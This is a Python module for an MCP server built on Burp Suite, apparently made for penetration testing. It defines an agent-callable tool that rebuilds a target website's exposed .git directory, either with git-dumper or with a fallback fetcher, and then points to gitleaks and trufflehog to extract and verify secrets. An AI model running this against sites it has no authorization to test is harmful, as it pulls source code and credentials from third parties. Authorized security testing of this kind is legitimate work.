"""git-dumper wrapper — reconstruct .git/ from exposed web directory listings.

https://github.com/arthaud/git-dumper

Usage chain:
    discover_common_files('/.git/HEAD' returned 200)
        -> dump_exposed_git(<base_url>)
            -> persists to .burp-intel/<domain>/git_dump/
                -> follow-up: run_gitleaks(mode='git', target=<dump_path>)
                -> follow-up: run_trufflehog(scan_type='git', target=<dump_path>, verify=True)

The dump is gitignored under .burp-intel/. Operator decides whether to retain
post-engagement.

Falls back to a minimal Python implementation if git-dumper binary is absent —
fetches /.git/HEAD, /.git/config, /.git/refs, /.git/objects/pack/* via Burp
proxy and reconstructs the bare repo by walking the object DAG.
"""

from __future__ import annotations

import asyncio
import os
import re
import shutil
import urllib.parse
from pathlib import Path

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.recon._common import _check_tool, _run_cmd


_REPO_ROOT = Path(__file__).resolve().parents[5]
_INTEL_ROOT = _REPO_ROOT / ".burp-intel"


def _sanitize_domain(s: str) -> str:
    return "".join(c for c in s if c.isalnum() or c in ".-_") or "unknown"


def _dump_dir(domain: str) -> Path:
    d = _INTEL_ROOT / _sanitize_domain(domain) / "git_dump"
    d.mkdir(parents=True, exist_ok=True)
    return d


_PACK_RE = re.compile(r"pack-[0-9a-f]{40}\.(pack|idx)")


async def _fallback_dump(base_url: str, out_dir: Path) -> str:
    """Minimal in-process .git fetch via Burp proxy. Covers the common case
    where directory listing is enabled OR pack files are predictable."""
    fetched: list[str] = []
    paths = [
        "HEAD",
        "config",
        "description",
        "info/refs",
        "info/packs",
        "packed-refs",
        "objects/info/packs",
        "logs/HEAD",
        "refs/heads/main",
        "refs/heads/master",
    ]

    for rel in paths:
        url = base_url.rstrip("/") + "/.git/" + rel
        data = await client.post("/api/http/curl", json={"url": url, "method": "GET"})
        if "error" in data:
            continue
        if data.get("status_code") != 200:
            continue
        body = data.get("response_body") or ""
        if not body:
            continue
        local = out_dir / rel
        local.parent.mkdir(parents=True, exist_ok=True)
        local.write_text(body, encoding="utf-8", errors="replace")
        fetched.append(rel)

        # Discover pack file names referenced by info/packs
        if rel == "objects/info/packs":
            for pack in _PACK_RE.findall(body):
                pack_url = base_url.rstrip("/") + f"/.git/objects/pack/{pack}"
                pack_data = await client.post(
                    "/api/http/curl", json={"url": pack_url, "method": "GET"}
                )
                if "error" in pack_data or pack_data.get("status_code") != 200:
                    continue
                pack_body = pack_data.get("response_body") or ""
                if pack_body:
                    local_pack = out_dir / "objects" / "pack" / pack
                    local_pack.parent.mkdir(parents=True, exist_ok=True)
                    local_pack.write_bytes(
                        pack_body.encode("latin-1", errors="replace")
                    )
                    fetched.append(f"objects/pack/{pack}")

    return f"fallback dump: {len(fetched)} files\n  " + "\n  ".join(fetched[:20])


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def dump_exposed_git(
        base_url: str,
        domain: str = "",
        timeout: int = 300,
    ) -> str:
        """Reconstruct a remote target's .git/ directory if /.git/HEAD is exposed.

        Detection chain: discover_common_files finds /.git/HEAD with 200 status
        ->  call this with the site base URL. Result lands in
            .burp-intel/<domain>/git_dump/ — pipe into run_gitleaks /
            run_trufflehog for secret extraction.

        Args:
            base_url: Site root (e.g. https://example.com). Tool appends /.git/.
            domain: Override the .burp-intel/<domain>/ directory (defaults to host of base_url)
            timeout: Max seconds for the whole dump
        """
        if not base_url.startswith(("http://", "https://")):
            return f"Error: base_url must be http(s) — got {base_url!r}"

        parsed = urllib.parse.urlparse(base_url)
        eff_domain = domain or parsed.hostname or ""
        if not eff_domain:
            return "Error: could not derive domain from base_url"

        out_dir = _dump_dir(eff_domain)

        if _check_tool("git-dumper") or _check_tool("git_dumper.py"):
            tool = "git-dumper" if _check_tool("git-dumper") else "git_dumper.py"
            git_url = base_url.rstrip("/") + "/.git/"
            env_proxy = os.environ.get("HTTPS_PROXY") or "http://127.0.0.1:8080"
            cmd = [tool, git_url, str(out_dir), "-p", env_proxy]
            stdout, stderr, rc = await _run_cmd(cmd, timeout=timeout, bypass_proxy=False)
            if rc != 0:
                return f"git-dumper rc={rc}\n{stderr[:800]}"
            files_found = sum(1 for _ in out_dir.rglob("*") if _.is_file())
            return (
                f"git-dumper: dumped to {out_dir} ({files_found} files)\n"
                f"Next: run_gitleaks(target='{out_dir}', mode='git') "
                f"AND run_trufflehog(target='{out_dir}', scan_type='git', verify=True)"
            )

        # Fallback — Python-only dump through Burp proxy
        try:
            summary = await asyncio.wait_for(
                _fallback_dump(base_url, out_dir), timeout=timeout
            )
            files_found = sum(1 for _ in out_dir.rglob("*") if _.is_file())
            return (
                f"# git-dumper not installed — used in-process fallback\n"
                f"# dumped to {out_dir} ({files_found} files)\n"
                f"{summary}\n\n"
                f"Next: run_gitleaks(target='{out_dir}') "
                f"AND run_trufflehog(target='{out_dir}', scan_type='filesystem', verify=True)\n"
                f"Install proper tool: pip install git-dumper  |  "
                f"https://github.com/arthaud/git-dumper"
            )
        except asyncio.TimeoutError:
            shutil.rmtree(out_dir, ignore_errors=True)
            return f"dump timed out after {timeout}s"
